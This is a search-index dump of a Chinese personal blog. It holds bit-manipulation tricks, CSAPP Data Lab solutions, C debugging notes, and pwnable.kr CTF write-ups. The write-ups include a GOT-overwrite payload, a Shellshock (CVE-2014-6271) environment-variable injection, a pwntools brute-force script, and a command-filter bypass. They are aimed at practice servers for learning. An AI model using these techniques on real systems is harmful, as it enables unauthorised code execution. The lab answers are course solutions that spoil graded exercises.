[{"categories":null,"content":" pwnable.kr python速成 csapp Data Lab 第三章 第二章家庭作业 zsh的使用? tmux又是什么? 温习? Vim symbolic link? ","date":"2022-10-17","objectID":"/tolearn/:0:0","tags":null,"title":"ToLearnList","uri":"/tolearn/"},{"categories":null,"content":"收录遇到的各种奇技淫巧 位运算转换大小写 转小写 ('a' | ' ') = 'a' ('A' | ' ') = 'a' 转大写 ('b' \u0026 '_') = 'B' ('B' \u0026 '_') = 'B' 大小写互换 ('c' ^ ' ') = 'C' ('C' ^ ' ') = 'C' 原理: ' ' = 20 = 0b00100000 '_' = 95 = 0b01011111 'A' = 65 = 0b01000001 'a' = 97 = 0b01100001 'A' - 'a' = 20 = ' ' = 0b00100000 可以看到二进制ASCII码A与a差的就是100000, 其代表的是’ ‘, 所以进行一个或运算可以将大写字母第5位的0变成1而不影响别的位, 小写字母不变. 同理, 与’A’进行与运算可以将小写字母的第6-8位从011变成大写字母的010, 而由于’_‘的0-5位全为1, 进行与运算不会影响这几位. 又同理, 将字母与’ ‘进行异或会将第5位的1变成0, 0变成1, 即可实现大小写互换. 总之, 小写字母与大写字母相差32 = 2^5,只要操控第5位即可转换大小写. 大写字母与小写字母中间多的六个字符想必不是巧合, 而是设计时的有意为之. ","date":"2022-10-15","objectID":"/tricks/:0:0","tags":null,"title":"奇技淫巧","uri":"/tricks/"},{"categories":null,"content":"环境准备 WSL2(Ubuntu22.04) + VSCode apt-get update sudo apt-get install build-essential sudo apt-get install gcc-multilib sudo apt-get install gdb ","date":"2022-10-15","objectID":"/csapp_lab/:1:0","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"Data Lab ","date":"2022-10-15","objectID":"/csapp_lab/:2:0","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"食用方法 阅读README获得完整信息 按照bits.c文件的注释修改bits.c 使用./dlc bits.c 检查代码是否符合标准, 若符合则无输出. ./dlc -e bits.c查看用了多少操作符 每次修改bits.c后 执行make clean \u0026\u0026 make btest编译测试工具 执行./btest检查正确性,./btest -f foo可以单独检查某个函数的正确性 运行./driver.pl打分 ","date":"2022-10-15","objectID":"/csapp_lab/:2:1","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"题目 bitXor 只使用~和\u0026实现^ a ^ b = (a | b) \u0026 (~a | ~b) = ~(~a \u0026 ~b) \u0026 (a \u0026 b) = (a \u0026 ~b) | (~a \u0026 b) //1 /* * bitXor - x^y using only ~ and \u0026 * Example: bitXor(4, 5) = 1 * Legal ops: ~ \u0026 * Max ops: 14 * Rating: 1 */ int bitXor(int x, int y) { return ~(~(x \u0026 ~ y) \u0026 ~(~x \u0026 y)); } tmin /* * tmin - return minimum two's complement integer * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 4 * Rating: 1 */ int tmin(void) { return 1 \u003c\u003c 31; } isTmax 最大值x应该是第一位为0, 其它位都为1, 则x+1 = ~x. 但是由于所有位都为1的-1+1之后进位的0会溢出消失, 所以-1 + 1 = ~(-1)需要特判, 只需特判~x是否为0, 即(!!~x) //2 /* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ \u0026 ^ | + * Max ops: 10 * Rating: 1 */ int isTmax(int x) { return !((x+1)^(~x))\u0026(!!~x); } allOddBits negate 返回-x x + (-x) = 0 x + ~x = 0xffffffff(所有位全为1) x + ~x + 1 = 0 -x = ~x + 1 /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 5 * Rating: 2 */ int negate(int x) { return ~x+1; } ","date":"2022-10-15","objectID":"/csapp_lab/:2:2","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"CSAPP第二章家庭作业2.65 /*Return 1 when x contains an odd number of 1s; 0 otherwise. Assume w=32 */ int odd_ones(unsigned x) 函数应该遵循位级整数编码规则,你的代码最多只能包含12个算术运算,位运算和逻辑运算. ","date":"2022-10-12","objectID":"/odd_ones/:0:0","tags":null,"title":"二进制数中1的个数是否为奇数","uri":"/odd_ones/"},{"categories":null,"content":"代码 先上个代码 int odd_ones(unsigned x) { x ^= x \u003e\u003e 16; x ^= x \u003e\u003e 8; x ^= x \u003e\u003e 4; x ^= x \u003e\u003e 2; x ^= x \u003e\u003e 1; return x \u0026 1; //http://stackoverflow.com/a/9133406 } 在使用循环的情况下就可以不用预先知道int的位数是多少,如下 int odd_ones(unsigned x) { int w = sizeof(x) * 8;//获得x有多少位二进制位,这里是32 int n = 1; while(n \u003c w) { x ^= (x \u003e\u003e n); n \u003c\u003c= 1; } return x \u0026 1; } ","date":"2022-10-12","objectID":"/odd_ones/:1:0","tags":null,"title":"二进制数中1的个数是否为奇数","uri":"/odd_ones/"},{"categories":null,"content":"原理 由于异或的性质, 可以反映异或对应位上1的个数. 例: 0 ^ 0 = 0, 0 ^ 1 = 1, 1 ^ 1 = 0. 即只有两位中有奇数个(1个)1的时候, 该位的异或值为1.也就是我们用异或结果的一个位压缩了进行异或的两位的1的个数. 依照这个思想我们可以先写出一个简单的版本: int odd_ones(unsigned x) { unsigned s = x \u003e\u003e 1; while(x) { x ^= s; s \u003e\u003e= 1; } return x \u0026 1; } 我们设最右侧一位为第0位,最左侧一位为第w位, 即x第0位一开始代表第0位的1是否为奇数个,一次异或后变为第0和第1位的1是否位奇数个, 然后是第0~2位中的1是否为奇数个… 经过w-1次移位, 第0位代表第0~w-1位的1总共是否为奇数个, 此时返回x\u00261即可. 但我们发现这样移位一次只利用了每次第0位的异或结果, 有优化空间. 我们可以同时利用多个异或结果, 并且这些异或结果所代表的位不能重叠.(因为最后需要有一位代表0~w-1位中1的个数, 若有重叠就会导致某一位多计算一次). 那么最大化且不重叠的利用办法就是一次右移一半, 像将这个数字\"对折\"一样. 此时的异或结果中0~w/2-1位中每一位分别代表第i位和第i+w/2-1位中1的个数是否为奇数. 每次右移一半直到只剩一位, 我们只需进行$log_2w$次异或和右移运算.代码见开头. ","date":"2022-10-12","objectID":"/odd_ones/:2:0","tags":null,"title":"二进制数中1的个数是否为奇数","uri":"/odd_ones/"},{"categories":null,"content":"用于记录一些比较奇怪/少见的c语法/易错易忘点/常见问题, 以备考试等用途 编译没过先看报错信息, 不认识英文请善用翻译 如何提问: 先使用搜索引擎. 如果一定要问人, 附上全部 全部 全部 代码, 以及报错信息 报错信息 报错信息. 和一组出错了的输入输出, 以及注释或你对代码的解释. 因为阅读别人的代码是一件很烧脑的事. 错误示范: 代码截图, 我错哪了? 不要拍屏 查错技巧: 学习使用gdb, 设置断点并查看相关变量的值. 一个低配但很快的方法是用printf输出关键变量 关于CSDN: 虽然内容质量感人被StackOverflow等英文网站甩了十条街, 但还是有一些值得一看的文章的. 而且哪怕用百度查到csdn文章看了也比啥也不查直接问强. 输入数据之后卡住了怎么办: 查看你的代码里是否有死循环, 或者你的输入格式是否合法. 输入输出对不上: 看看格式控制符跟变量类型能否对应, 常见错误是用%f读入double类型变量. 报错信息里有cannot open output file .../*.exe: permission denied或者\"无法打开xxx程序进行写入\"之类的东西: 你之前的程序没关掉 输出了奇怪的数字: 大概率数组越界 Segmentation fault: 访问了不可访问的内存. 常见原因是数组越界, 指针漂移, 缓冲区溢出, 数组开太大爆栈… 带缺省值的参数需要放在后面, 这样在调用函数的时候就可以不写那个参数. 放在前面编译会报错. int f(int a = 0, int b); // wrong int f(int b, int a = 0); // right 字符串占用的空间要算上 ‘\\0’ 关于锟斤拷烫烫烫等成因: 手持两把锟斤拷，口中疾呼烫烫烫,脚踏千朵屯屯屯，笑看万物锘锘锘 锟斤拷 源于GBK字符集和Unicode字符集之间的转换问题。Unicode和老编码体系的转化过程中，肯定有一些字，用Unicode是没法表示的，Unicode官方用了一个占位符来表示这些文字，这就是：U+FFFD REPLACEMENT CHARACTER。那么U+FFFD的UTF-8编码出来，恰好是 ‘\\xef\\xbf\\xbd’。如果这个’\\xef\\xbf\\xbd’，重复多次，例如 ‘\\xef\\xbf\\xbd\\xef\\xbf\\xbd’，然后放到GBK/CP936/GB2312/GB18030的环境中显示的话，一个汉字2个字节，最终的结果就是：锟斤拷——锟(0xEFBF)，斤（0xBDEF），拷（0xBFBD）。 烫烫烫 VS/VC debug模式下栈内未初始化的内存会全部被设置成0xcc, 这个0xcc是INT3中断指令, 所以执行这块内存就会中断程序. VS调试器默认字符集是MBCS, 其中0xcccc是’烫’字, 所以…… INT3断点是断点的一种，在诸如Ollydbg中的快捷键是F2，是一种很常用的断点类型。INT3指令的机器码为CC，所以通常也称之为CC指令。当被调试进程执行INT3指令导致一个异常时，调试器就会捕捉这个异常从而停在断点处，然后将断点处的指令恢复成原来的指令。当然，如果自己写调试器，也可以用其他一些指令代替INT3指令来触发异常。。 屯屯屯 由于相似的原因, 堆中空间的缺省值是0xcd, 也是一个中断指令的机器码, 0xcdcd是屯 锘锘锘 BOM 是 Byte Order Mark 的缩写。是UTF编码方案里用于标识编码的标准标记，在UTF-16里本来是FF FE，变成UTF-8就成了EF BB BF。这个标记是可选的，因为UTF8字节没有顺序，所以它可以被用来检测一个字节流是否是UTF-8编码的。 常见原因是在记事本里保存了代码, 因为记事本用utf-8编码, 而且保存自动加BOM 锘EFBB 匡BFEF 豢BBBF 葺葺葺 虽然诗里没有, 但堆上申请后释放空间后缺省值是0xdd, 0xdddd是葺 \u003c优先级比=高, 这使 if(x = f() \u003c 0) 并不会像看起来那样工作, 它会首先执行f()\u003c0, 最后被赋值给x的是这个关系运算符的真(1)假(0). 宏/函数/内联函数 参数: 宏的参数在展开时不经任何处理直接进行字符串替换, 函数的参数会进行类型检查, 计算后由实参传值到形参. 形参是函数内的局部变量, 占用栈空间. 宏的展开由预处理器处理, 在预编译(编译之前)时进行, 直接用宏体替换宏名, 占用预编译时间. 函数在执行时才会被调用. 调用时需要保护现场(保存调用者保存的寄存器), 进入函数, 返回主调函数, 恢复现场(恢复寄存器). 宏会有各种副作用, 这使它难于调试 由于简单的展开, ++ –运算符可能会执行多次 同样由于简单的展开, 如果不加足够多的括号, 会出很多优先级的问题. 但宏也有很多好处 可以在并不直接允许重载的C语言里实现简单的重载(不过用指针等方法也可以实现) 对于简单而重复多次的功能, 可以大大减小开销, 提升速度 实现其他奇技淫巧 内联函数(inline) 由编译器处理 用类似宏的方法, 将函数代码直接嵌入到调用处, 不能有循环, 选择等任何复杂结构, 可以节约开销的同时防止宏的一些副作用. 如果函数不够简单, 编译器会拒绝内联. 在开了某些优化时编译器会自动将一些简单的函数内联. ","date":"2022-10-12","objectID":"/c/:0:0","tags":null,"title":"C八股及常见问题","uri":"/c/"},{"categories":null,"content":"JuicyMio 前OIer 现尝试学习CTF 邮箱:guanhyjuicymio@gmail.com ","date":"2022-10-12","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"pwnable.kr writeup python3中使用p32, p64需要进行编码 payload +=p64(1926).decode(\"iso-8859-1\") ","date":"2022-10-12","objectID":"/pwnable.kr/:0:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"1 fd 文件描述符(file descricptor) 维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。 习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2. //fd.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u003c2){ printf(\"pass argv[1] a number\\n\"); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf)){ printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); } printf(\"learn about Linux file IO\\n\"); return 0; } 得到flag的关键在于如歌通过第二个if语句, 也就是如何让buf=LETMEMIN 可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了. 注意到fd在此处赋值: int fd = atoi( argv[1] ) - 0x1234; 其中atoi是将字符串转化为整数的函数 int main(int argc, char* argv[], char* envp[]){ 可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到. 例如运行程序fd ./fd 4660 此时argc值为2, 而argv[0] = “./fd”, argv[1] = “4660” atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660 这样我们就可以让fd = 0, 程序等待从stdin中读取字符 我们再向命令行中输入LETMEWIN, 即可得到flag ","date":"2022-10-12","objectID":"/pwnable.kr/:1:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"2 collision ","date":"2022-10-12","objectID":"/pwnable.kr/:2:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"5 passcode 这题没太懂GOT PLT那里的具体原理 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e void login(){ int passcode1; int passcode2; printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 \u0026\u0026 passcode2==13371337){ printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); } else{ printf(\"Login Failed!\\n\"); exit(0); } } void welcome(){ char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name); } int main(){ printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0; } 容易注意到login函数中这句 scanf(\"%d\", passcode1); 本应该为 scanf(\"%d\", \u0026passcode1); 也就是说scanf本该向passcode1所在地址写入内容, 却变成了将passcode1中存入的数作为地址, 向其写入内容. 这给了我们可乘之机, 如果能够覆盖passcode1的内容, 就可以向这个地址写入内容. 那么如何修改passcode1呢? 自然我们要看在其之前执行的welcome函数, 它读入了100个字符. 用IDA反编译一下 int login() { int v1; // [esp+18h] [ebp-10h] int v2; // [esp+1Ch] [ebp-Ch] printf(\"enter passcode1 : \"); __isoc99_scanf(\"%d\", v1); fflush(stdin); printf(\"enter passcode2 : \"); __isoc99_scanf(\"%d\", v2); puts(\"checking...\"); if ( v1 != 338150 || v2 != 13371337 ) { puts(\"Login Failed!\"); exit(0); } puts(\"Login OK!\"); return system(\"/bin/cat flag\"); } unsigned int welcome() { char v1[100]; // [esp+18h] [ebp-70h] BYREF unsigned int v2; // [esp+7Ch] [ebp-Ch] v2 = __readgsdword(0x14u); printf(\"enter you name : \"); __isoc99_scanf(\"%100s\", v1); printf(\"Welcome %s!\\n\", v1); return __readgsdword(0x14u) ^ v2; } 由于welcome和login紧挨着先后执行, 那么代表栈底的ebp应该没有改变. login中的v1即passcode1在ebp-10h的位置, welcome中的v1即name在ebp-70h的位置, 70h-10h = 60h = 96. 也就是他们位置相差96字节, 而我们可以输入100个字节, 这多出的4个字节就正好可以覆盖passcode1. 如果把passcode1覆盖成printf函数的GOT,再在scanf向passcode1内的地址, 即我们覆盖的printf的GOT写入时输入system的GOT, 就可以将即将执行的printf变成system(\"/bin/cat flag\")这个指令了. 在IDA里找到他们: .plt:08048420 .plt:08048420 ; =============== S U B R O U T I N E ======================================= .plt:08048420 .plt:08048420 ; Attributes: thunk .plt:08048420 .plt:08048420 ; int printf(const char *format, ...) .plt:08048420 _printf proc near ; CODE XREF: login+E↓p .plt:08048420 ; login+3C↓p ... .plt:08048420 .plt:08048420 format = dword ptr 4 .plt:08048420 .plt:08048420 jmp ds:off_804A000 .plt:08048420 _printf endp .plt:08048420 .text:08048562 ; --------------------------------------------------------------------------- .text:08048563 align 4 .text:08048564 .text:08048564 ; =============== S U B R O U T I N E ======================================= .text:08048564 .text:08048564 ; Attributes: bp-based frame .text:08048564 .text:08048564 public login .text:08048564 login proc near ; CODE XREF: main+1A↓p .text:08048564 .text:08048564 var_10 = dword ptr -10h .text:08048564 var_C = dword ptr -0Ch .text:08048564 .text:08048564 ; __unwind { .text:08048564 push ebp .text:08048565 mov ebp, esp .text:08048567 sub esp, 28h .text:0804856A mov eax, offset format ; \"enter passcode1 : \" .text:0804856F mov [esp], eax ; format .text:08048572 call _printf .text:08048577 mov eax, offset aD ; \"%d\" .text:0804857C mov edx, [ebp+var_10] .text:0804857F mov [esp+4], edx .text:08048583 mov [esp], eax .text:08048586 call ___isoc99_scanf .text:0804858B mov eax, ds:stdin@@GLIBC_2_0 .text:08048590 mov [esp], eax ; stream .text:08048593 call _fflush .text:08048598 mov eax, offset aEnterPasscode2 ; \"enter passcode2 : \" .text:0804859D mov [esp], eax ; format .text:080485A0 call _printf .text:080485A5 mov eax, offset aD ; \"%d\" .text:080485AA mov edx, [ebp+var_C] .text:080485AD mov [esp+4], edx .text:080485B1 mov [esp], eax .text:080485B4 call ___isoc99_scanf .text:080485B9 mov dword ptr [esp], offset s ; \"checking...\" .text:080485C0 call _puts .text:080485C5 cmp [ebp+var_10], 528E6h .text:080485CC jnz short loc_80485F1 .text:080485CE cmp [ebp+var_C], 0CC07C9h .text:080485D5 jnz short loc_80485F1 .text:080485D7 mov dword ptr [esp], offset a","date":"2022-10-12","objectID":"/pwnable.kr/:3:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"实现: python -c 'print \"A\"*96+\"\\x00\\xa0\\x04\\x08\"+\"134514147\\n\"' | ./passcode ","date":"2022-10-12","objectID":"/pwnable.kr/:3:1","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"6 random #include \u003cstdio.h\u003e int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", \u0026key); if( (key ^ random) == 0xdeadbeef ){ printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; } printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0; } 注意到rand()没有用srand()设定种子, 那么种子默认为1, 生成的随机数应该是一个固定的序列. 我们在本地编译, 用gdb调试该程序, 得到random的值为1804289383. 而key^random的值应该是0xdeadbeef, 由于^的逆运算是它本身, deadbeef^random=key. 算出key = -1255736440, 运行random程序输入key得到flag random@pwnable:~$ ./random -1255736440 Good! Mommy, I thought libc random is unpredictable... ","date":"2022-10-12","objectID":"/pwnable.kr/:4:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"7 input ","date":"2022-10-12","objectID":"/pwnable.kr/:5:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"8 leg ","date":"2022-10-12","objectID":"/pwnable.kr/:6:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"9 mistake We all make mistakes, let's move on. (don't take this too seriously, no fancy hacking skill is required at all) This task is based on real event Thanks to dhmonkey hint : operator priority ssh mistake@pwnable.kr -p2222 (pw:guest) 提示是操作符的优先级 #include \u003cstdio.h\u003e #include \u003cfcntl.h\u003e #define PW_LEN 10 #define XORKEY 1 void xor(char* s, int len){ int i; for(i=0; i\u003clen; i++){ s[i] ^= XORKEY; } } int main(int argc, char* argv[]){ int fd; if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) \u003c 0){ printf(\"can't open password %d\\n\", fd); return 0; } printf(\"do not bruteforce...\\n\"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) \u003e 0)){ printf(\"read error\\n\"); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(\"input password : \"); scanf(\"%10s\", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(\"Password OK\\n\"); system(\"/bin/cat flag\\n\"); } else{ printf(\"Wrong Password\\n\"); } close(fd); return 0; } 观察这一行 if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) \u003c 0){ 乍一看没什么不对, 当返回的文件描述符小于0时报错 但是\u003c是比=优先级高的, 所以事实上首先open()会返回3(0, 1, 2是什么见第1题fd), 然后执行3\u003c0这个表达式, 它的值是0. 最后执行fd=0, 由第一题fd我们学到了fd = 0是stdin. 所以事实上password是我们输入的. 然后我们再来看xor这个函数, 它将一个字符串的前n个字符与1异或. 题目中给出的是前10个字符. 所以我们只需要先输入10个字符作为password, 再输入这些字符异或1得到的字符串. 由于字符'0’的ascii码为110000, 字符'1’的ascii码为110001, 恰好'0’^1 = ‘1’. 所以只需进行如下操作 ./mistake do not bruteforce... 0000000000 1111111111input password : Password OK Mommy, the operator priority always confuses me :( ","date":"2022-10-12","objectID":"/pwnable.kr/:7:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"10 shellshock 这是一个set-uid程序: #include \u003cstdio.h\u003e int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(\"/home/shellshock/bash -c 'echo shock_me'\"); return 0; } 这是一个别名为shellshock的漏洞, CVE-2014-6271 原理大概是bash读取环境变量时会调用后面的函数, 在调用bash时会直接触发 export foo='{:;}; echo test' bash test 测试方法: shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\" this is a test shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' ./bash -c \"echo this is a test\" vulnerable 证明环境变量中的bash没有此漏洞, 而当前目录的bash有此漏洞 攻击该程序: 如果real uid和effective uid相同时, 环境变量在程序内有效, 就可以利用这个漏洞. 而本题代码中 setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); 确保了这一点. 所以可以这样攻击: shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock only if I knew CVE-2014-6271 ten years ago..!! Segmentation fault shellshock@ubuntu:~$ ","date":"2022-10-12","objectID":"/pwnable.kr/:8:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"11 coin1 ","date":"2022-10-12","objectID":"/pwnable.kr/:9:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"12 blackjack ","date":"2022-10-12","objectID":"/pwnable.kr/:10:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"13 lotto lotto.c: #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \u003cfcntl.h\u003e unsigned char submit[6]; void play(){ int i; printf(\"Submit your 6 lotto bytes : \"); fflush(stdout); int r; r = read(0, submit, 6); printf(\"Lotto Start!\\n\"); //sleep(1); // generate lotto numbers int fd = open(\"/dev/urandom\", O_RDONLY); if(fd==-1){ printf(\"error. tell admin\\n\"); exit(-1); } unsigned char lotto[6]; if(read(fd, lotto, 6) != 6){ printf(\"error2. tell admin\\n\"); exit(-1); } for(i=0; i\u003c6; i++){ lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 } close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i\u003c6; i++){ for(j=0; j\u003c6; j++){ if(lotto[i] == submit[j]){ match++; } } } // win! if(match == 6){ system(\"/bin/cat flag\"); } else{ printf(\"bad luck...\\n\"); } } void help(){ printf(\"- nLotto Rule -\\n\"); printf(\"nlotto is consisted with 6 random natural numbers less than 46\\n\"); printf(\"your goal is to match lotto numbers as many as you can\\n\"); printf(\"if you win lottery for *1st place*, you will get reward\\n\"); printf(\"for more details, follow the link below\\n\"); printf(\"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n\"); printf(\"mathematical chance to win this game is known to be 1/8145060.\\n\"); } int main(int argc, char* argv[]){ // menu unsigned int menu; while(1){ printf(\"- Select Menu -\\n\"); printf(\"1. Play Lotto\\n\"); printf(\"2. Help\\n\"); printf(\"3. Exit\\n\"); scanf(\"%d\", \u0026menu); switch(menu){ case 1: play(); break; case 2: help(); break; case 3: printf(\"bye\\n\"); return 0; default: printf(\"invalid menu\\n\"); break; } } return 0; } 看这段: for(i=0; i\u003c6; i++){ for(j=0; j\u003c6; j++){ if(lotto[i] == submit[j]){ match++; } } } 原本应该是lotto和submit按顺序一一对应, 但是这段代码写成了对于lotto中的每一位, 只要submit中有x个与它相同就会使match+x. 这大大降低了枚举难度. 我们只要认死一个1~45中的字符, 比如’#’, 一直输入 “######”, 只要随机出的lotto中有一个#, 就可以让match+6, 从而得到flag. 不会写代码识别flag, 所以我只能人工盯着屏幕看了 from pwn import * s = ssh(host='pwnable.kr',user='lotto', port=2222, password='guest') p = s.process('./lotto') while 1: p.sendline(\"1\") p.sendline(\"######\") print(p.recvline()) # s.interactive() 可以看到得到flag还是很快的, 看到flag就可以ctrl+c结束脚本了 [+] Starting remote process bytearray(b'./lotto') on pwnable.kr: pid 281220 /home/juicymio/mycode/lotto.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes p.sendline(\"1\") /home/juicymio/mycode/lotto.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes p.sendline(\"######\") b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'sorry mom... I FORGOT to check duplicate numbers... :(\\n' // 第一次出现flag在这 b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lott","date":"2022-10-12","objectID":"/pwnable.kr/:11:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"14 cmd1 #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int filter(char* cmd){ int r=0; r += strstr(cmd, \"flag\")!=0; r += strstr(cmd, \"sh\")!=0; r += strstr(cmd, \"tmp\")!=0; return r; } int main(int argc, char* argv[], char** envp){ putenv(\"PATH=/thankyouverymuch\"); if(filter(argv[1])) return 0; system( argv[1] ); return 0; } 代码很短, 主要就是执行system(argv[1])但可以看到该程序把PATH指向了一个显然不能用的路径, 而且我们传入的argv里不能包含flag, sh, tmp, 也就是不能直接或间接地把flag打印出来. 没有环境变量, 就直接用绝对路径\"/bin/cat\" 不能直接出现flag, 但可以用*通配符啊 所以 ./cmd \"/bin/cat fl*\" ","date":"2022-10-12","objectID":"/pwnable.kr/:12:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"https://cybersec.ustc.edu.cn/2022/0826/c23847a565848/page.htm 2017-03 ‘Hint: You don’,27h,’t need to reverse the decryption logic itself 小米9 2340x1080 2608722 2618733 听起来像kdelife 搜出来kdenlive ","date":"0001-01-01","objectID":"/untitled/:0:0","tags":null,"title":"","uri":"/untitled/"}]